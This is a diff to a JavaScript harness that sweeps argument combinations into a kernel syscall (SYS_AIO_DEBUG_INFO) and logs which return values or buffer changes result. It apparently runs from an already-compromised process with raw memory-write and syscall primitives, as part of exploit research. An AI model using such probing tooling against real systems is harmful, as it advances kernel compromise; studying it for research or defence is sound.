@@ -335,51 +335,100 @@
         for (var si = 0; si < OUTLEN; si++) sentinel[si] = 0xEE;
 
         write64(idBuf, id0);
+        write64(idLoBuf, id0 & 0xFFFFFFFFn);
+
+        var idsPtr = ids;
+        var reqsPtr = reqs;
+        var idLow32 = id0 & 0xFFFFFFFFn;
+        var idHigh32 = id0 >> 32n;
+        var idLow16 = id0 & 0xFFFFn;
+        var idMasked80 = (id0 >> 16n) & 0x7Fn;
+        var idLow32Shift16 = (id0 & 0xFFFFFFFFn) >> 16n;
 
         var shapes = [];
 
-        /* A: arg1 sweep, everything else 0. Finds the upper bound of the small
-         *    "enum" set that reaches EPERM instead of EFAULT. */
-        [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0x10, 0x20, 0x40, 0x80,
-         0x100, 0x200, 0x400, 0x800, 0x1000].forEach(function (x) {
-            shapes.push({
-                name: "A a1=" + x,
-                args: function () { return [BigInt(x), 0n, 0n, 0n, 0n, 0n]; }
-            });
+        /* A: arg3 alternates, all other args at the EPERM baseline
+         *    (arg1=arg2=0, arg4=1, arg5=out). Question: which value of arg3
+         *    reaches EPERM, and which stays at EFAULT? */
+        [
+            ["id_full",        id0],
+            ["low32",          idLow32],
+            ["low16",          idLow16],
+            ["high32",         idHigh32],
+            ["id>>16",         id0 >> 16n],
+            ["(low32>>16)",    idLow32Shift16],
+            ["(id>>16)&0x7f",  idMasked80],
+            ["id&0x7f",        id0 & 0x7Fn],
+            ["id_lo16_clear",  id0 & 0xFFFFFFFFFFFF0000n],
+            ["id^1",           id0 ^ 1n],
+            ["idsPtr",         idsPtr],
+            ["reqsPtr",        reqsPtr],
+            ["reqs+0x28",      reqsPtr + 0x28n],
+            ["idBuf",          idBuf],
+            ["idLoBuf",        idLoBuf],
+            ["outBuf",         outBuf],
+            ["0x10000",        0x10000n],
+            ["0x7f0000",       0x7F0000n],
+            ["0x800000",       0x800000n],
+            ["0x7f",           0x7Fn],
+            ["0x80",           0x80n],
+            ["0x100000000",    0x100000000n]
+        ].forEach(function (e) {
+            shapes.push({ name: "A3=" + e[0],
+                args: function () { return [0n, 0n, e[1], 1n, outBuf, 0n]; } });
         });
 
-        /* B: arg2 sweep with arg1=0. */
-        var i;
-        for (i = 0; i <= 0x10; i++) {
-            shapes.push((function (y) {
-                return { name: "B a2=" + y,
-                         args: function () { return [0n, BigInt(y), 0n, 0n, 0n, 0n]; } };
-            })(i));
-        }
+        /* B: arg4 sweep with arg3=id, arg5=out. */
+        [0, 1, 2, 3, 4, 5, 6, 7, 8, 0x10, 0x20, 0x40, 0x80, 0x100, 0x228].forEach(function (x) {
+            shapes.push({ name: "A4=" + x,
+                args: function () { return [0n, 0n, id0, BigInt(x), outBuf, 0n]; } });
+        });
 
-        /* C/D/E/F: 2-D grids over the small-arg1 set.
-         *   C: arg3=id, arg4=1, arg5=out     (the shape the writeup describes)
-         *   D: arg3=0,  arg4=0, arg5=out     (only the out buffer)
-         *   E: arg3=out,arg4=0, arg5=0       (out as the "id")
-         *   F: arg3=0,  arg4=0x228, arg5=out (count in arg4) */
-        for (i = 0; i <= 3; i++) {
-            for (var j = 0; j <= 3; j++) {
-                (function (x, y) {
-                    shapes.push({ name: "C id  a1=" + x + " a2=" + y,
-                        args: function () { return [BigInt(x), BigInt(y), id0, 1n, outBuf, 0n]; } });
-                    shapes.push({ name: "D 0   a1=" + x + " a2=" + y,
-                        args: function () { return [BigInt(x), BigInt(y), 0n, 0n, outBuf, 0n]; } });
-                    shapes.push({ name: "E out a1=" + x + " a2=" + y,
-                        args: function () { return [BigInt(x), BigInt(y), outBuf, 0n, 0n, 0n]; } });
-                    shapes.push({ name: "F cnt a1=" + x + " a2=" + y,
-                        args: function () { return [BigInt(x), BigInt(y), 0n, 0x228n, outBuf, 0n]; } });
-                })(i, j);
-            }
-        }
+        /* C: arg5 alternates with arg3=id, arg4=1. */
+        [
+            ["0",         0n],
+            ["out",       outBuf],
+            ["out+8",     outBuf + 8n],
+            ["out+0x20",  outBuf + 0x20n],
+            ["idsPtr",    idsPtr],
+            ["reqsPtr",   reqsPtr],
+            ["idBuf",     idBuf],
+            ["idLoBuf",   idLoBuf],
+            ["outLenBuf", outLenBuf]
+        ].forEach(function (e) {
+            shapes.push({ name: "A5=" + e[0],
+                args: function () { return [0n, 0n, id0, 1n, e[1], 0n]; } });
+        });
+
+        /* D: arg1 alternates with arg3=id, arg4=1, arg5=out. */
+        [
+            ["0",         0n],
+            ["1",         1n],
+            ["idsPtr",    idsPtr],
+            ["reqsPtr",   reqsPtr],
+            ["idBuf",     idBuf],
+            ["outBuf",    outBuf],
+            ["outLenBuf", outLenBuf],
+            ["0x28",      0x28n],
+            ["0x100",     0x100n],
+            ["0x228",     0x228n]
+        ].forEach(function (e) {
+            shapes.push({ name: "A1=" + e[0],
+                args: function () { return [e[1], 0n, id0, 1n, outBuf, 0n]; } });
+        });
+
+        /* E: arg2 alternates. */
+        [
+            ["0",     0n],   ["1",    1n],   ["2",    2n],   ["4",    4n],
+            ["0x28",  0x28n], ["0x40", 0x40n], ["0x100", 0x100n], ["0x228", 0x228n]
+        ].forEach(function (e) {
+            shapes.push({ name: "A2=" + e[0],
+                args: function () { return [0n, e[1], id0, 1n, outBuf, 0n]; } });
+        });
 
         var counts = [1n];
         var liveIds = [id0];
-        out("SWEEP", liveIds.length + " id(s), " + shapes.length + " shapes", "dim");
+        out("SWEEP", liveIds.length + " id(s), " + shapes.length + " shapes, id0=" + hex(id0), "dim");
 
         var hits = 0;
         var wedged = false;
@@ -388,9 +437,6 @@
         for (var si3 = 0; si3 < shapes.length && !wedged; si3++) {
             var sh3 = shapes[si3];
             fill(outBuf, OUTLEN, 0xEE);
-            var olb = readBytes(outLenBuf, 4);
-            olb[0] = 0x40; olb[1] = 0; olb[2] = 0; olb[3] = 0;
-            root.write_buffer(B(outLenBuf), olb);
             var a3 = sh3.args();
             var ret3 = S(SYS_AIO_DEBUG_INFO, a3[0], a3[1], a3[2], a3[3], a3[4], a3[5]);
             if (!canary()) {
@@ -400,22 +446,59 @@
             var got3 = readBytes(outBuf, OUTLEN);
             var changed3 = !bytesEqual(got3, sentinel);
             if (changed3) hits++;
-            var lenAfter = readBytes(outLenBuf, 4);
-            var lenWord = lenAfter[0] | (lenAfter[1] << 8) | (lenAfter[2] << 16) | (lenAfter[3] << 24);
-            var lenChanged = lenWord !== 0x40;
-            var interesting = ret3 !== 0xen && ret3 !== 0x1n;
             if (ret3 !== 0xen) NON_EFAULT.push(sh3.name + "=" + hex(ret3));
-            out("CALL", sh3.name
-                + (changed3 ? "  BUFFER-CHANGED: " + hexBytes(got3).slice(0, 48) : "")
-                + (lenChanged ? "  outLen=" + lenWord : "")
-                + " -> " + hex(ret3),
-                (changed3 || lenChanged || interesting) ? "ok" : "dim");
+            out("CALL", sh3.name + " -> " + hex(ret3)
+                + (changed3 ? "  BUF-CHANGED: " + hexBytes(got3).slice(0, 40) : ""),
+                (changed3 || (ret3 !== 0xen && ret3 !== 0x1n)) ? "ok" : "dim");
         }
 
-        out("NON-EFAULT", NON_EFAULT.length
-            ? NON_EFAULT.slice(0, 60).join("  ")
-            : "every shape returned EFAULT",
-            NON_EFAULT.length ? "ok" : "dim");
+        /* F: complete one request via write() on the pipe, then retry the baseline
+         *    shapes. A completed request may be the state the kernel wants. */
+        out("F-PRE", "completing one pending read via write(wfd,1)", "dim");
+        try {
+            var one = malloc(0x10);
+            root.write_buffer(one, new Uint8Array([0x41]));
+            S(SYS_WRITE, BigInt(wfd), one, 1n, 0n, 0n, 0n);
+        } catch (e) { }
+        for (var qi = 0; qi < 200; qi++) S(SYS_SCHED_YIELD, 0n, 0n, 0n, 0n, 0n, 0n);
+        if (!canary()) {
+            out("WEDGE", "after write completion canary failed", "err");
+            wedged = true;
+        }
+        if (!wedged) {
+            [
+                { name: "F id,1,out",      args: function () { return [id0, 1n, outBuf, 0n, 0n, 0n]; } },
+                { name: "F 0,0,id,1,out",  args: function () { return [0n, 0n, id0, 1n, outBuf, 0n]; } },
+                { name: "F 0,0,id,0,out",  args: function () { return [0n, 0n, id0, 0n, outBuf, 0n]; } },
+                { name: "F low32,1,out",   args: function () { return [idLow32, 1n, outBuf, 0n, 0n, 0n]; } },
+                { name: "F idsPtr,2,out",  args: function () { return [idsPtr, 2n, outBuf, 0n, 0n, 0n]; } },
+                { name: "F out,id,1",      args: function () { return [outBuf, id0, 1n, 0n, 0n, 0n]; } },
+                { name: "F reqsPtr,2,out", args: function () { return [reqsPtr, 2n, outBuf, 0n, 0n, 0n]; } },
+                { name: "F id,0,out",      args: function () { return [id0, 0n, outBuf, 0n, 0n, 0n]; } }
+            ].forEach(function (sh) {
+                if (wedged) return;
+                fill(outBuf, OUTLEN, 0xEE);
+                var aF = sh.args();
+                var retF = S(SYS_AIO_DEBUG_INFO, aF[0], aF[1], aF[2], aF[3], aF[4], aF[5]);
+                if (!canary()) {
+                    out("WEDGE", "shape=" + sh.name + " -> " + hex(retF), "err");
+                    wedged = true; return;
+                }
+                var gotF = readBytes(outBuf, OUTLEN);
+                var changedF = !bytesEqual(gotF, sentinel);
+                if (changedF) hits++;
+                if (retF !== 0xen) NON_EFAULT.push(sh.name + "=" + hex(retF));
+                out("CALL", sh.name + " -> " + hex(retF)
+                    + (changedF ? "  BUF-CHANGED: " + hexBytes(gotF).slice(0, 40) : ""),
+                    (changedF || (retF !== 0xen && retF !== 0x1n)) ? "ok" : "dim");
+            });
+        }
+
+        if (NON_EFAULT.length) {
+            out("NON-EFAULT", NON_EFAULT.join("  "), "ok");
+        } else {
+            out("NON-EFAULT", "every shape returned EFAULT", "dim");
+        }
 
         try {
             var stClean = zeros(malloc(0x20), 0x20);
